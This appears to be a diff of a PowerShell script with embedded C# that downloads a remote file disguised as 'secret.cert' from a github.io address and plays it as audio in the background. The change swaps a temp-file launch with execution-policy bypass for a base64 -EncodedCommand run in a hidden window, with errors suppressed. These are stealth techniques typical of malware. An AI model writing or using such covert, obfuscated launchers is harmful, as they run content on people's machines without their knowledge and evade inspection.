@@ -4,7 +4,6 @@ using System;
 using System.Media;
 using System.Net;
 using System.IO;
-using System.Threading.Tasks;
 public class BgAudio {
     public static void Play(string url) {
         try {
@@ -15,7 +14,7 @@ public class BgAudio {
                 stream.CopyTo(ms);
                 ms.Position = 0;
                 var player = new SoundPlayer(ms);
-                player.PlaySync();   # PlaySync aby proces trzymał odtwarzanie
+                player.PlaySync();
             }
         } catch { }
     }
@@ -24,6 +23,7 @@ public class BgAudio {
 [BgAudio]::Play("https://testmina77.github.io/0000/secret.cert")
 '@
 
-$path = "$env:TEMP\playaudio.ps1"
-$script | Out-File -FilePath $path -Encoding UTF8
-Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encoded = [Convert]::ToBase64String($bytes)
+
+Start-Process powershell -ArgumentList "-NoProfile -EncodedCommand $encoded" -WindowStyle Hidden
